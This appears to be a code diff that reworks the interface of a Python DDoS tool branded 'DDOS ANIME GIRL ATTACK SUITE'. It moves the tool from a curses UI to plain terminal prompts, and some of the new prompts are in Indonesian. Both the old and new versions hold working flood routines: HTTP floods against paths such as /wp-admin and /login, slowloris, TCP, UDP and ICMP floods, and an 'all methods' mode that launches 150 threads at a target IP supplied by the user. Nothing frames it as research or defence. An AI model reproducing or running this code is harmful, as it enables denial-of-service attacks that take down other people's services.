@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-import curses
+import os
+import sys
 import socket
 import threading
 import random
@@ -7,11 +8,8 @@ import time
 import requests
 from datetime import datetime
 
-# Color pairs for pink theme
-COLOR_PINK = 1
-COLOR_HOTPINK = 2
-COLOR_WHITE = 3
-COLOR_RED = 4
+# Clear screen
+os.system('clear')
 
 stats = {
     'total_packets': 0,
@@ -22,17 +20,9 @@ stats = {
     'target': '',
     'port': 12000,
     'rps': 0,
-    'last_second': 0
+    'last_packets': 0,
+    'last_time': 0
 }
-
-sockets_pool = []
-
-banner = r"""
-    ╔══════════════════════════════════════════════════════════╗
-    ║     🌸  DDOS ANIME GIRL ATTACK SUITE v3.0  🌸           ║
-    ║     "Kawaii but Deadly ~ Senpai Notice Me!"             ║
-    ╚══════════════════════════════════════════════════════════╝
-"""
 
 methods = {
     '1': 'HTTP FLOOD',
@@ -44,12 +34,36 @@ methods = {
     '7': 'ALL METHODS (HADES MODE)'
 }
 
-def http_flood(target_ip, port):
+# Pink colors for terminal
+PINK = '\033[95m'
+HOTPINK = '\033[91m'
+WHITE = '\033[97m'
+RESET = '\033[0m'
+BOLD = '\033[1m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+CYAN = '\033[96m'
+
+def banner():
+    os.system('clear')
+    print(f"""{HOTPINK}{BOLD}
+╔══════════════════════════════════════════════════════════╗
+║     🌸  DDOS ANIME GIRL ATTACK SUITE v3.0  🌸           ║
+║     "Kawaii but Deadly ~ Senpai Notice Me!"             ║
+╚══════════════════════════════════════════════════════════╝{RESET}
+    """)
+    print(f"{PINK}     ╱|、{RESET}")
+    print(f"{PINK}   (˚ˎ 。7  {RESET}")
+    print(f"{PINK}    |、˜〵   {RESET}")
+    print(f"{PINK}    じしˍ,)ノ   ~ Senpai ~{RESET}")
+    print()
+
+def http_flood():
     urls = [
-        f"http://{target_ip}:{port}/",
-        f"http://{target_ip}:{port}/wp-admin",
-        f"http://{target_ip}:{port}/api",
-        f"http://{target_ip}:{port}/login"
+        f"http://{stats['target']}:{stats['port']}/",
+        f"http://{stats['target']}:{stats['port']}/wp-admin",
+        f"http://{stats['target']}:{stats['port']}/api",
+        f"http://{stats['target']}:{stats['port']}/login"
     ]
     headers = [
         {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
@@ -66,13 +80,13 @@ def http_flood(target_ip, port):
         except:
             pass
 
-def slowloris(target_ip, port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(2)
+def slowloris():
     try:
-        sock.connect((target_ip, port))
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2)
+        sock.connect((stats['target'], stats['port']))
         sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
-        sock.send(f"Host: {target_ip}\r\n".encode())
+        sock.send(f"Host: {stats['target']}\r\n".encode())
         sock.send("User-Agent: Mozilla/5.0\r\n".encode())
         sock.send("Accept-language: en-US,en;q=0.5\r\n".encode())
         
@@ -84,13 +98,13 @@ def slowloris(target_ip, port):
     except:
         pass
 
-def tcp_flood(target_ip, port):
+def tcp_flood():
     while stats['running']:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(1)
-            sock.connect((target_ip, port))
-            payload = random._urandom(1024) + b"\x00" * 512
+            sock.connect((stats['target'], stats['port']))
+            payload = random._urandom(1024)
             sock.send(payload * 10)
             stats['total_packets'] += 100
             stats['total_bytes'] += len(payload) * 10
@@ -98,42 +112,38 @@ def tcp_flood(target_ip, port):
         except:
             pass
 
-def udp_flood(target_ip, port):
+def udp_flood():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while stats['running']:
         payload = random._urandom(65500)
-        sock.sendto(payload, (target_ip, port))
+        sock.sendto(payload, (stats['target'], stats['port']))
         stats['total_packets'] += 1
         stats['total_bytes'] += 65500
 
-def syn_flood(target_ip, port):
-    # Raw socket requires root, fallback to TCP
-    tcp_flood(target_ip, port)
+def syn_flood():
+    tcp_flood()
 
-def icmp_flood(target_ip, port):
-    # Ping flood
+def icmp_flood():
     while stats['running']:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
             packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x01' + b'\x00\x02' + random._urandom(64)
-            sock.sendto(packet, (target_ip, 0))
+            sock.sendto(packet, (stats['target'], 0))
             stats['total_packets'] += 1
             stats['total_bytes'] += 64
         except:
             pass
 
-def all_methods(target_ip, port):
+def all_methods():
     methods_list = [http_flood, slowloris, tcp_flood, udp_flood, syn_flood, icmp_flood]
     while stats['running']:
-        random.choice(methods_list)(target_ip, port)
+        random.choice(methods_list)()
 
-def start_attack(target_ip, port, method_choice):
-    stats['target'] = target_ip
-    stats['port'] = port
-    stats['method'] = methods[method_choice]
+def start_attack():
     stats['running'] = True
+    stats['last_time'] = time.time()
+    stats['last_packets'] = 0
     
-    threads = []
     method_func = {
         '1': http_flood,
         '2': slowloris,
@@ -142,138 +152,82 @@ def start_attack(target_ip, port, method_choice):
         '5': syn_flood,
         '6': icmp_flood,
         '7': all_methods
-    }[method_choice]
+    }[stats['method_choice']]
     
     for i in range(150):
-        t = threading.Thread(target=method_func, args=(target_ip, port))
+        t = threading.Thread(target=method_func)
         t.daemon = True
         t.start()
-        threads.append(t)
         stats['active_threads'] = i + 1
 
-def draw_ui(stdscr):
-    curses.start_color()
-    curses.init_pair(COLOR_PINK, curses.COLOR_MAGENTA, curses.COLOR_BLACK)
-    curses.init_pair(COLOR_HOTPINK, curses.COLOR_RED, curses.COLOR_BLACK)
-    curses.init_pair(COLOR_WHITE, curses.COLOR_WHITE, curses.COLOR_BLACK)
-    curses.init_pair(COLOR_RED, curses.COLOR_RED, curses.COLOR_BLACK)
+def show_stats():
+    now = time.time()
+    if now - stats['last_time'] >= 1:
+        stats['rps'] = stats['total_packets'] - stats['last_packets']
+        stats['last_packets'] = stats['total_packets']
+        stats['last_time'] = now
     
-    curses.curs_set(0)
-    stdscr.nodelay(1)
-    
-    last_packets = 0
-    last_time = time.time()
-    
-    while True:
-        stdscr.clear()
-        height, width = stdscr.getmaxyx()
-        
-        # Pink border
-        stdscr.attron(curses.color_pair(COLOR_PINK))
-        for i in range(width):
-            stdscr.addch(0, i, '═')
-            stdscr.addch(height-1, i, '═')
-        for i in range(height):
-            stdscr.addch(i, 0, '║')
-            stdscr.addch(i, width-1, '║')
-        stdscr.addch(0, 0, '╔')
-        stdscr.addch(0, width-1, '╗')
-        stdscr.addch(height-1, 0, '╚')
-        stdscr.addch(height-1, width-1, '╝')
-        
-        # Title
-        title = "🌸 DDOS ANIME GIRL ATTACK SUITE 🌸"
-        stdscr.attron(curses.color_pair(COLOR_HOTPINK) | curses.A_BOLD)
-        stdscr.addstr(1, (width - len(title)) // 2, title)
-        
-        # Anime girl ASCII
-        anime_girl = [
-            "     ╱|、",
-            "   (˚ˎ 。7  ",
-            "    |、˜〵   ",
-            "    じしˍ,)ノ   ~ Senpai ~"
-        ]
-        for i, line in enumerate(anime_girl):
-            stdscr.attron(curses.color_pair(COLOR_PINK))
-            stdscr.addstr(3 + i, 2, line)
-        
-        # Stats box
-        stdscr.attron(curses.color_pair(COLOR_WHITE))
-        stdscr.addstr(3, 40, "┌─────────────────────────────┐")
-        stdscr.addstr(4, 40, "│     📊 REAL-TIME STATS       │")
-        stdscr.addstr(5, 40, "├─────────────────────────────┤")
-        
-        now = time.time()
-        if now - last_time >= 1:
-            stats['rps'] = stats['total_packets'] - last_packets
-            last_packets = stats['total_packets']
-            last_time = now
-        
-        stats_lines = [
-            f"│ 🎯 Target : {stats['target']}:{stats['port']}",
-            f"│ ⚔️ Method : {stats['method']}",
-            f"│ 💥 Packets: {stats['total_packets']:,}",
-            f"│ 📦 Bytes  : {stats['total_bytes']/1024/1024:.2f} MB",
-            f"│ ⚡ RPS    : {stats['rps']}",
-            f"│ 🧵 Threads: {stats['active_threads']}",
-            f"│ 🟢 Status : {'ATTACKING' if stats['running'] else 'IDLE'}",
-        ]
-        
-        for i, line in enumerate(stats_lines):
-            stdscr.addstr(6 + i, 40, line)
-        stdscr.addstr(6 + len(stats_lines), 40, "└─────────────────────────────┘")
-        
-        # Menu
-        menu_y = 15
-        stdscr.attron(curses.color_pair(COLOR_HOTPINK) | curses.A_BOLD)
-        stdscr.addstr(menu_y, 2, "⚔️ SELECT ATTACK METHOD ⚔️")
-        stdscr.attron(curses.color_pair(COLOR_WHITE))
-        
-        for key, method in methods.items():
-            stdscr.addstr(menu_y + int(key) + 1, 4, f"[{key}] {method}")
-        
-        stdscr.addstr(menu_y + 9, 4, "[S] START ATTACK")
-        stdscr.addstr(menu_y + 10, 4, "[X] STOP ATTACK")
-        stdscr.addstr(menu_y + 11, 4, "[Q] QUIT")
-        
-        # Input
-        stdscr.attron(curses.color_pair(COLOR_PINK))
-        stdscr.addstr(height-3, 2, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        stdscr.addstr(height-2, 2, "💬 Command: ")
-        
-        key = stdscr.getch()
-        
-        if key == ord('q') or key == ord('Q'):
-            stats['running'] = False
-            break
-        elif key == ord('s') or key == ord('S'):
-            if not stats['running']:
-                curses.echo()
-                stdscr.addstr(height-2, 12, "Enter Target IP: ")
-                target = stdscr.getstr(height-2, 28, 50).decode('utf-8')
-                stdscr.addstr(height-2, 12, "Enter Port [12000]: ")
-                port_str = stdscr.getstr(height-2, 32, 10).decode('utf-8')
-                port = int(port_str) if port_str else 12000
-                stdscr.addstr(height-2, 12, "Method [1-7]: ")
-                method = stdscr.getstr(height-2, 25, 1).decode('utf-8')
-                curses.noecho()
-                
-                if method in methods:
-                    threading.Thread(target=start_attack, args=(target, port, method), daemon=True).start()
-                    stdscr.addstr(height-2, 12, "✅ Attack started!     ")
-        elif key == ord('x') or key == ord('X'):
-            stats['running'] = False
-            stats['active_threads'] = 0
-            stdscr.addstr(height-2, 12, "🛑 Attack stopped!     ")
-        
-        stdscr.refresh()
-        time.sleep(0.1)
+    print(f"{PINK}╔════════════════════════════════════════════════╗{RESET}")
+    print(f"{PINK}║        📊 REAL-TIME STATS                    ║{RESET}")
+    print(f"{PINK}╠════════════════════════════════════════════════╣{RESET}")
+    print(f"{PINK}║{RESET} 🎯 Target : {CYAN}{stats['target']}:{stats['port']}{RESET}")
+    print(f"{PINK}║{RESET} ⚔️ Method : {YELLOW}{stats['method']}{RESET}")
+    print(f"{PINK}║{RESET} 💥 Packets: {GREEN}{stats['total_packets']:,}{RESET}")
+    print(f"{PINK}║{RESET} 📦 Bytes  : {GREEN}{stats['total_bytes']/1024/1024:.2f} MB{RESET}")
+    print(f"{PINK}║{RESET} ⚡ RPS    : {HOTPINK}{stats['rps']}{RESET}")
+    print(f"{PINK}║{RESET} 🧵 Threads: {HOTPINK}{stats['active_threads']}{RESET}")
+    print(f"{PINK}║{RESET} 🟢 Status : {GREEN if stats['running'] else YELLOW}{'ATTACKING' if stats['running'] else 'IDLE'}{RESET}")
+    print(f"{PINK}╚════════════════════════════════════════════════╝{RESET}")
 
 def main():
-    print(banner)
-    print("\033[95m🌸 Welcome to Anime DDoS Suite! Starting GUI...\033[0m")
-    time.sleep(1)
-    curses.wrapper(draw_ui)
+    banner()
+    
+    # Input target
+    stats['target'] = input(f"{PINK}🌸 Target IP: {RESET}")
+    port_input = input(f"{PINK}🎀 Port [{stats['port']}]: {RESET}")
+    if port_input:
+        stats['port'] = int(port_input)
+    
+    # Menu method
+    print(f"\n{PINK}⚔️ SELECT ATTACK METHOD ⚔️{RESET}")
+    for key, method in methods.items():
+        print(f"  {CYAN}[{key}]{RESET} {method}")
+    
+    stats['method_choice'] = input(f"\n{PINK}💬 Pilih method [1-7]: {RESET}")
+    while stats['method_choice'] not in methods:
+        stats['method_choice'] = input(f"{HOTPINK}❌ Salah! Pilih 1-7: {RESET}")
+    
+    stats['method'] = methods[stats['method_choice']]
+    
+    # Start attack
+    print(f"\n{GREEN}✅ Memulai serangan ke {stats['target']}:{stats['port']}{RESET}")
+    print(f"{HOTPINK}🔥 Press ENTER to stop attack{RESET}\n")
+    
+    attack_thread = threading.Thread(target=start_attack)
+    attack_thread.daemon = True
+    attack_thread.start()
+    
+    # Real-time stats loop
+    try:
+        while True:
+            show_stats()
+            time.sleep(0.5)
+            # Check for enter key (non-blocking doesn't work well, so we use input with timeout)
+            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                input()
+                break
+    except KeyboardInterrupt:
+        pass
+    except:
+        # Fallback untuk Termux yang ga support select
+        time.sleep(5)
+        input(f"\n{PINK}Press ENTER to stop...{RESET}")
+    
+    stats['running'] = False
+    stats['active_threads'] = 0
+    print(f"\n{HOTPINK}🛑 Attack stopped!{RESET}")
+    print(f"{PINK}🌸 Thanks for using, Senpai~{RESET}")
 
 if __name__ == "__main__":
+    import select
     main()
